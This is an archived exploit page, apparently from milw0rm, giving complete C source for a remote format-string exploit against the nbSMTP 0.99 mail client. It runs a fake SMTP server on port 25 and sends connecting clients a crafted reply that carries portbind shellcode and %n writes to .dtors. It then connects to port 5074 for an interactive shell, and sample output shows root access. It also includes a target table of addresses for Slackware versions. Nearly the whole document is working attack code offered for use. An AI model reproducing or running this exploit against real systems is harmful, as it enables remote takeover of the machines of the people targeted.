<html>
<head>
<title>nbSMTP <= 0.99 (util.c) Client-Side Command Execution Exploit</title>
<pre>
/* nbSMTP_fsexp.c
 *
 * nbSMTP v0.99 remote format string exploit
 * by CoKi &lt;coki@nosystem.com.ar&gt;
 *
 * root@nosystem:/home/coki/audi# ./nbSMTP_fsexp
 *
 *  nbSMTP v0.99 remote format string exploit
 *  by CoKi &lt;coki@nosystem.com.ar&gt;
 *
 *  Use: ./nbSMTP_fsexp [options]
 *
 *  options:
 *         -t &lt;arg&gt;    type of target system
 *         -r &lt;arg&gt;    return address
 *         -s &lt;arg&gt;    shellcode address
 *         -o &lt;arg&gt;    offset
 *         -l          targets list
 * 
 * root@nosystem:/home/coki/audit# ./nbSMTP_fsexp -t2
 *
 *  nbSMTP v0.99 remote format string exploit
 *  by CoKi &lt;coki@nosystem.com.ar&gt;
 *
 *  [*] system                     : Slackware Linux 10.0
 *  [*] return address             : 0x0804d8cc
 *  [*] shellcode address          : 0x08053613
 *  [*] building evil buffer       : done
 *  [*] running fake smtp server   : done
 *
 *  [*] waiting...                 : 10.0.0.1:2046 connected
 *  [*] sending evil command...    : done
 *
 *  [*] checking for shell...      : done
 *
 *  [!] you have a shell :)
 *
 * Linux servidor 2.4.26 #29 Mon Jun 14 19:22:30 PDT 2004 i586 unknown unknown GNU/Linux
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),102(bbs)
 *
 * Tested in Slackware Linux 9.0 / 10.0 / 10.1
 *
 * by CoKi &lt;coki@nosystem.com.ar&gt;
 * No System Group - http://www.nosystem.com.ar
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/fcntl.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;

#define SMTPD		25
#define BUFFERSIZE	1024
#define ERROR		-1
#define TIMEOUT		3
#define SHELL		5074

int connect_timeout(int sfd, struct sockaddr *serv_addr,
	socklen_t addrlen, int timeout);
int check(unsigned long addr);
void use(char *program);
void printlist(void);
void shell(char *host, int port);
void exploit(int retaddr, int shaddr);

/*
 * Shellcode - portbind 5074 (84 bytes)
 * by Giuseppe Gottardi 'oveRet' &lt;overet@securitydate.it&gt;
 */

char shellcode[] = 
	&quot;\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89&quot;
	&quot;\xe1\xcd\x80\x52\x43\x68\xff\x02\x13\xd2\x89\xe1&quot;
	&quot;\x6a\x10\x51\x50\x89\xe1\x89\xc6\xb0\x66\xcd\x80&quot;
	&quot;\x43\x43\xb0\x66\xcd\x80\x52\x56\x89\xe1\x43\xb0&quot;
	&quot;\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80&quot;
	&quot;\x41\xe2\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f&quot;
	&quot;\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;

struct {
	int num;
	char *os;
	int retaddr;
	int shaddr;
}targets[] = {
	1, &quot;Slackware Linux 9.0&quot;, 0x0804d4d4, 0x080531c3,	// .dtors
	2, &quot;Slackware Linux 10.0&quot;, 0x0804d8cc, 0x08053613,	// .dtors
	3, &quot;Slackware Linux 10.1&quot;, 0x0804d898, 0x08053e4e	// .dtors
	};

int main(int argc, char *argv[])
{
	char opt, *system=NULL;
	int shaddr=0, retaddr=0, targetnum=0, offset=0, i;

	printf(&quot;\n nbSMTP v0.99 remote format string exploit\n&quot;);
	printf(&quot; by CoKi &lt;coki@nosystem.com.ar&gt;\n\n&quot;);

	while((opt = getopt(argc,argv,&quot;r:s:t:lo:&quot;)) != EOF) {
		switch (opt) {
			case 'r':
				retaddr = strtoul(optarg,NULL,0);
				system = &quot;unknown&quot;;
				break;
			case 's':
				shaddr = strtoul(optarg,NULL,0);
				break;
			case 't':
				targetnum = atoi(optarg)-1;
				if(targets[targetnum].num) {				
					system = targets[targetnum].os;
					retaddr = targets[targetnum].retaddr;
					shaddr = targets[targetnum].shaddr;
				}
				else use(argv[0]);
				break;
			case 'l':
				printlist();
				break;
			case 'o':
					offset = atoi(optarg);
			        shaddr += offset;
			        break;
			default:
				use(argv[0]);
				break;
		}
	}

	if(retaddr == 0) use(argv[0]);
	if(shaddr == 0) use(argv[0]);
	if(system == NULL) {
		system = &quot;unknown&quot;;
	}

	printf(&quot; [*] system\t\t\t: %s\n&quot;, system);
	printf(&quot; [*] return address\t\t: %010p\n&quot;, retaddr);

	printf(&quot; [*] shellcode address\t\t: %010p&quot;, shaddr);
	fflush(stdout);

	if(offset) printf(&quot; (offset %d)\n&quot;, offset);
	else printf(&quot;\n&quot;);

	exploit(retaddr, shaddr);
}

void exploit(int retaddr, int shaddr) {
	char smtp[BUFFERSIZE], temp[BUFFERSIZE], recvbuf[BUFFERSIZE], host[255];
	int sock, newsock, i, reuseaddr=1;
	unsigned int bal1, bal2;
	int cn1, cn2;
	struct sockaddr_in remoteaddr;
	struct sockaddr_in localaddr;
	int addrlen = sizeof(struct sockaddr_in);
	struct hostent *he;

	printf(&quot; [*] building evil buffer\t:&quot;);
	fflush(stdout);

	/* adding pads */
	sprintf(smtp, &quot;553 xx&quot;);

	/* adding return address */
	bzero(temp, sizeof(temp));
	sprintf(temp, &quot;%s&quot;, &amp;retaddr);
	strncat(smtp, temp, 4);
	retaddr += 2;
	sprintf(temp, &quot;%s&quot;, &amp;retaddr);
	strncat(smtp, temp, 4);

	/* adding nops */
	strcat(smtp, &quot;\x90\x90\x90\x90&quot;);

	/* adding shellcode */
	strcat(smtp, shellcode);

	bal1 = (shaddr &amp; 0xffff0000) &gt;&gt; 16;
	bal2 = (shaddr &amp; 0x0000ffff);

	cn1 = bal2 - 14 - 2 - 8 - 4 - 84;
	cn1 = check(cn1);
	cn2 = bal1 - bal2;
	cn2 = check(cn2);

	/* adding evil string */
	sprintf(temp, &quot;%%%du%%7$n%%%du%%8$n&quot;, cn1, cn2);
	strcat(smtp, temp);
	strcat(smtp, &quot;\n&quot;);

	printf(&quot; done\n&quot;);
	printf(&quot; [*] running fake smtp server\t:&quot;);
	fflush(stdout);

	localaddr.sin_family = AF_INET;
	localaddr.sin_port = htons(SMTPD);
	localaddr.sin_addr.s_addr = INADDR_ANY;
	bzero(&amp;(localaddr.sin_zero), 8);

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) {
		perror(&quot; socket()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &amp;reuseaddr,
		(socklen_t)sizeof(reuseaddr)) &lt; 0) {
		perror(&quot; setsockopt()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	if (bind(sock, (struct sockaddr *)&amp;localaddr, sizeof(localaddr)) &lt; 0) {
		perror(&quot; bind()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	if (listen(sock, 1) &lt; 0) {
		perror(&quot; listen()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	printf(&quot; done\n&quot;);
	printf(&quot;\n [*] waiting...&quot;);
	fflush(stdout);

	if ((newsock = accept(sock, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen)) &lt; 0) {
		perror(&quot; accept()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	if (getpeername(newsock, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen) &lt; 0) {
		perror(&quot; getpeername()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	printf(&quot;\t\t\t: %s:%u connected\n&quot;, inet_ntoa(remoteaddr.sin_addr), ntohs(remoteaddr.sin_port));
	fflush(stdout);

	printf(&quot; [*] sending evil command...\t:&quot;);
	fflush(stdout);

	bzero(temp, sizeof(temp));
	sprintf(temp, &quot;220\n&quot;);

	if (write(newsock, temp, strlen(temp)) &lt;= 0) {
		perror(&quot; write()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	if (read(newsock, recvbuf, sizeof(recvbuf)) &lt;= 0) {
		perror(&quot; read()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	bzero(temp, sizeof(temp));
	sprintf(temp, &quot;250\n&quot;);

	if (write(newsock, temp, strlen(temp)) &lt;= 0) {
		perror(&quot; write()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	if (read(newsock, recvbuf, sizeof(recvbuf)) &lt;= 0) {
		perror(&quot; read()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	if (write(newsock, smtp, strlen(smtp)) &lt;= 0) {
		perror(&quot; write()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	close(sock);
	close(newsock);

	printf(&quot; done\n\n&quot;);
	fflush(stdout);
		
	printf(&quot; [*] checking for shell...\t:&quot;);
	fflush(stdout);

	sprintf(host, &quot;%s&quot;, inet_ntoa(remoteaddr.sin_addr));
	sleep(1);

	shell(host, SHELL);
}

void shell(char *host, int port) {
	int sockfd, n;
	char buff[BUFFERSIZE], *command = &quot;uname -a; id;\n&quot;;
	fd_set readfs;
	struct hostent *he;
	struct sockaddr_in dest_dir;

	if((he=gethostbyname(host)) == NULL) {
		herror(&quot; gethostbyname()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == ERROR) {
		perror(&quot; socket()&quot;);
		printf(&quot;\n&quot;);
		exit(1);
	}

	dest_dir.sin_family = AF_INET;
	dest_dir.sin_port = htons(port);
	dest_dir.sin_addr = *((struct in_addr *)he-&gt;h_addr);
	bzero(&amp;(dest_dir.sin_zero), 8);

	if(connect_timeout(sockfd, (struct sockaddr *)&amp;dest_dir,
		sizeof(struct sockaddr), TIMEOUT) == ERROR) {

		printf(&quot; failed!\n\n&quot;);
		exit(1);
	}

	printf(&quot; done&quot;);
	fflush(stdout);

	/* owned ;) */
	printf(&quot;\n\n [!] you have a shell :)\n\n&quot;);
	fflush(stdout);

	send(sockfd, command, strlen(command), 0);

	while(1) {
		FD_ZERO(&amp;readfs);
		FD_SET(0, &amp;readfs);
		FD_SET(sockfd, &amp;readfs);
		if(select(sockfd+1, &amp;readfs, NULL, NULL, NULL) &lt; 1) exit(0);
		if(FD_ISSET(0,&amp;readfs)) {
			if((n = read(0,buff,sizeof(buff))) &lt; 1)
			exit(0);
			if(send(sockfd, buff, n, 0) != n) exit(0);
		}
		if(FD_ISSET(sockfd,&amp;readfs)) {
			if((n = recv(sockfd, buff, sizeof(buff), 0)) &lt; 1) exit(0);
			write(1, buff, n);
		}
	}
}

int connect_timeout(int sfd, struct sockaddr *serv_addr,
	socklen_t addrlen, int timeout) {

	int res, slen, flags;
	struct timeval tv;
	struct sockaddr_in addr;
	fd_set rdf, wrf;

	fcntl(sfd, F_SETFL, O_NONBLOCK);

	res = connect(sfd, serv_addr, addrlen);

	if (res &gt;= 0) return res;

	FD_ZERO(&amp;rdf);
	FD_ZERO(&amp;wrf);

	FD_SET(sfd, &amp;rdf);
	FD_SET(sfd, &amp;wrf);
	bzero(&amp;tv, sizeof(tv));
	tv.tv_sec = timeout;

	if (select(sfd + 1, &amp;rdf, &amp;wrf, 0, &amp;tv) &lt;= 0)
		return -1;

	if (FD_ISSET(sfd, &amp;wrf) || FD_ISSET(sfd, &amp;rdf)) {
		slen = sizeof(addr);
		if (getpeername(sfd, (struct sockaddr*)&amp;addr, &amp;slen) == -1)
			return -1;

		flags = fcntl(sfd, F_GETFL, NULL);
		fcntl(sfd, F_SETFL, flags &amp; ~O_NONBLOCK);

		return 0;
	}

	return -1;
}

int check(unsigned long addr) {
	char tmp[128];
	snprintf(tmp, sizeof(tmp), &quot;%d&quot;, addr);
	if(atoi(tmp) &lt; 10)
	addr = addr + 65536;

	return addr;
}

void use(char *program) {
	printf(&quot; Use: %s [options]\n&quot;, program);
	printf(&quot;\n options:\n&quot;);
	printf(&quot;	-t &lt;arg&gt;    type of target system\n&quot;);
	printf(&quot;	-r &lt;arg&gt;    return address\n&quot;);
	printf(&quot;	-s &lt;arg&gt;    shellcode address\n&quot;);
	printf(&quot;	-o &lt;arg&gt;    offset\n&quot;);
	printf(&quot;	-l          targets list\n\n&quot;);
	exit(1);
}

void printlist(void) {
	int i=0;

	printf(&quot; targets\n&quot;);
	printf(&quot; -------\n\n&quot;);

	while(targets[i].num) {
		printf(&quot; [%d] %s\n&quot;, targets[i].num, targets[i].os);
		i++;
	}
	
	printf(&quot;\n&quot;);
	exit(0);
}

// milw0rm.com [2005-08-05]
</pre>
</html>

